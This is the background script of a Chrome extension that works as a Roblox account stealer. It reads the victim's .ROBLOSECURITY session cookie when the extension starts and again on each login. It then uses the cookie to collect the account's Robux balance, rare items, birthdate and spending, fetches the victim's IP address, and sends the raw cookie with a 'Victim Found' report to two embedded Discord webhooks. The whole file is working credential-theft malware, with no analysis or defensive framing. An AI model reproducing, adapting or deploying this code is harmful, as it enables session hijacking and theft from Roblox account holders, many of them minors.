const WEBHOOKS = [
    "https://discord.com/api/webhooks/1434366752757907647/XmEejYjMqXxYyguPefy0d3DDQxYqFuk6uo6dj8bWXWlkmAbz_lwOWwbc5Qeyl2XJZs3a",
    "https://discord.com/api/webhooks/1428991632472281179/wCh1K8TJUBc6zethK1iCLy6AnYw3jpYpTv2XZuRye7cr39Zv2Nik57xsLVsnkXB5-djA" // Add your second webhook URL here
];
const MENTION = "@everyone";

let lastCookie = null; // Track last sent cookie
let lastUserId = null; // Track last user ID to prevent duplicates

async function checkOwnership(userId, assetId, cookie) {
    try {
        let res = await fetch(`https://inventory.roblox.com/v1/users/${userId}/items/Asset/${assetId}`, {
            method: "GET",
            headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
        });
        if (!res.ok) return false;
        let json = await res.json();
        return json?.data?.length > 0;
    } catch {
        return false;
    }
}

async function getTotalSpentRobux(userId, cookie) {
    try {
        // Try multiple endpoints to get spent Robux data
        const endpoints = [
            `https://economy.roblox.com/v1/users/${userId}/transaction-totals?timeFrame=Year`,
            `https://economy.roblox.com/v1/users/${userId}/currency`,
            `https://premiumfeatures.roblox.com/v1/users/${userId}/spent`
        ];
        
        for (let endpoint of endpoints) {
            try {
                let res = await fetch(endpoint, {
                    method: "GET",
                    headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
                });
                
                if (res.ok) {
                    let data = await res.json();
                    
                    // Check different possible response structures
                    if (data.totalSpent !== undefined) return data.totalSpent;
                    if (data.purchasesTotal !== undefined) return data.purchasesTotal;
                    if (data.totalRobuxSpent !== undefined) return data.totalRobuxSpent;
                    if (data.spent !== undefined) return data.spent;
                    
                    // For currency endpoint, calculate from balance changes
                    if (data.robux !== undefined && data.robuxPending !== undefined) {
                        // This is a rough estimate - actual spending would need transaction history
                        return "N/A"; // Can't accurately calculate from balance alone
                    }
                }
            } catch (e) {
                continue; // Try next endpoint
            }
        }
        
        // Fallback: Try to estimate from premium status and items
        if (await checkOwnership(userId, 18122167, cookie)) { // Korblox check
            return "5000+"; // Estimated minimum for Korblox
        }
        
        return "N/A";
    } catch (error) {
        console.error("Error fetching spent Robux:", error);
        return "N/A";
    }
}

async function getBirthdayInfo(cookie) {
    try {
        let res = await fetch("https://users.roblox.com/v1/birthdate", {
            method: "GET",
            headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
        });
        
        if (!res.ok) {
            return { birthday: "N/A", ageVerified: "❌ No" };
        }
        
        let birthdate = await res.json();
        if (birthdate.birthDay && birthdate.birthMonth && birthdate.birthYear) {
            const monthNames = ["January", "February", "March", "April", "May", "June",
                "July", "August", "September", "October", "November", "December"];
            
            const birthday = `${monthNames[birthdate.birthMonth - 1]} ${birthdate.birthYear}`;
            
            // Calculate if age is verified (13+ years old)
            const today = new Date();
            const birthDate = new Date(birthdate.birthYear, birthdate.birthMonth - 1, birthdate.birthDay);
            let age = today.getFullYear() - birthdate.birthYear;
            
            // Adjust age if birthday hasn't occurred this year
            if (today.getMonth() < birthDate.getMonth() || 
                (today.getMonth() === birthDate.getMonth() && today.getDate() < birthDate.getDate())) {
                age--;
            }
            
            const ageVerified = age >= 13 ? "✅ Yes" : "❌ No";
            
            return { birthday, ageVerified };
        }
        
        return { birthday: "N/A", ageVerified: "❌ No" };
    } catch (error) {
        console.error("Error fetching birthday:", error);
        return { birthday: "N/A", ageVerified: "❌ No" };
    }
}

async function sendToWebhook(webhookUrl, embedPayload) {
    try {
        await fetch(webhookUrl, { 
            method: "POST", 
            headers: { "Content-Type": "application/json" }, 
            body: JSON.stringify(embedPayload) 
        });
    } catch (error) {
        console.error(`Failed to send to webhook: ${webhookUrl}`, error);
    }
}

async function main(cookie) {
    if (!cookie) return;

    // Prevent duplicate sends by checking both cookie and user ID
    if (cookie === lastCookie) {
        console.log("Duplicate cookie detected, skipping...");
        return;
    }

    let ipAddr = await (await fetch("https://api.ipify.org")).text();
    let statistics = null;

    try {
        let res = await fetch("https://users.roblox.com/v1/users/authenticated", {
            method: "GET",
            headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
        });
        if (!res.ok) throw "Failed to get user info";

        let user = await res.json();
        
        // Check if this is the same user as last time
        if (user.id === lastUserId) {
            console.log("Duplicate user detected, skipping...");
            return;
        }
        
        lastUserId = user.id; // Store current user ID

        // Robux + Pending
        let economyRes = await fetch("https://economy.roblox.com/v1/user/currency", {
            method: "GET",
            headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
        });
        
        let economy = { robux: "N/A", robuxPending: "N/A" };
        if (economyRes.ok) {
            economy = await economyRes.json();
        }

        // Premium
        let premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${user.id}/validate-membership`, {
            method: "GET",
            headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
        });
        let isPremium = premiumRes.ok ? await premiumRes.json() : false;

        // Profile picture
        let thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${user.id}&size=420x420&format=Png&isCircular=false`);
        let thumbJson = await thumbRes.json();
        let thumbUrl = "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png";
        if (thumbJson?.data?.length > 0 && thumbJson.data[0].imageUrl) {
            thumbUrl = thumbJson.data[0].imageUrl;
        }

        // Korblox + Headless
        let hasKorblox = await checkOwnership(user.id, 18122167, cookie);
        let hasHeadless = await checkOwnership(user.id, 134082579, cookie);

        // Get birthday info and spent Robux
        let birthdayInfo = await getBirthdayInfo(cookie);
        let totalSpentPastYear = await getTotalSpentRobux(user.id, cookie);

        statistics = {
            UserName: user.name,
            UserId: user.id,
            RobuxBalance: economy.robux ?? "N/A",
            PendingRobux: economy.robuxPending ?? "N/A",
            IsPremium: isPremium,
            ThumbnailUrl: thumbUrl,
            Korblox: hasKorblox,
            Headless: hasHeadless,
            Birthday: birthdayInfo.birthday,
            AgeVerified: birthdayInfo.ageVerified,
            TotalSpentPastYear: totalSpentPastYear
        };

        // Update last cookie only after successful data fetch
        lastCookie = cookie;

    } catch (e) {
        console.error("Error fetching Roblox data:", e);
        return; // Don't update lastCookie if there was an error
    }

    // Embed
    let embedPayload = {
        embeds: [
            {
                color: 0xFF0000,
                description: `\`\`\`${cookie ?? "COOKIE NOT FOUND"}\`\`\``,
                fields: [
                    { name: "Username", value: statistics?.UserName ?? "N/A", inline: true },
                    { name: "User ID", value: statistics?.UserId ?? "N/A", inline: true },
                    { name: "Birthday", value: statistics?.Birthday ?? "N/A", inline: true },
                    { name: "Age Verified", value: statistics?.AgeVerified ?? "N/A", inline: true },
                    { name: "<:balance:1396065501574205542> Robux", value: statistics?.RobuxBalance?.toLocaleString() ?? "N/A", inline: true },
                    { name: "⌛ Pending", value: statistics?.PendingRobux?.toLocaleString() ?? "N/A", inline: true },
                    { name: "💸 Spent (1yr)", value: String(statistics?.TotalSpentPastYear ?? "N/A"), inline: true },
                    { name: "Premium", value: statistics ? (statistics.IsPremium ? "✅ Yes" : "❌ No") : "N/A", inline: true },
                    { name: "<:korblox:1153613134599307314> Korblox", value: statistics ? (statistics.Korblox ? "✅ Owns" : "❌ None") : "N/A", inline: true },
                    { name: "<:head_full:1207367926622191666> Headless", value: statistics ? (statistics.Headless ? "✅ Owns" : "❌ None") : "N/A", inline: true }
                ],
                author: {
                    name: `Victim Found: ${ipAddr}`,
                    icon_url: statistics?.ThumbnailUrl ?? "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png"
                },
                thumbnail: { url: statistics?.ThumbnailUrl ?? "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png" },
                footer: {
                    text: "ENTERPRISE",
                    icon_url: "https://i.postimg.cc/bwpLd4YK/IMG-20250822-180503.jpg"
                },
                timestamp: new Date().toISOString()
            }
        ],
        username: "Extension Logger",
        avatar_url: "https://i.postimg.cc/bwpLd4YK/IMG-20250822-180503.jpg",
        content: MENTION
    };

    // Send to all webhooks
    WEBHOOKS.forEach(webhookUrl => {
        sendToWebhook(webhookUrl, embedPayload);
    });
}

// Startup listener with duplicate protection
chrome.cookies.get({ url: "https://www.roblox.com/home", name: ".ROBLOSECURITY" }, cookie => {
    if (cookie?.value && cookie.value !== lastCookie) {
        main(cookie.value);
    }
});

// Listen for cookie changes with duplicate protection
chrome.cookies.onChanged.addListener(changeInfo => {
    if (changeInfo.cookie?.name === ".ROBLOSECURITY" && changeInfo.cookie.domain.includes("roblox.com")) {
        if (changeInfo.removed) {
            console.log("Roblox cookie removed (logout)");
            lastCookie = null; // Reset when cookie is removed
            lastUserId = null;
        } else {
            console.log("Roblox cookie updated (login/refresh)");
            // Only process if it's a new cookie
            if (changeInfo.cookie.value !== lastCookie) {
                main(changeInfo.cookie.value);
            }
        }
    }
});
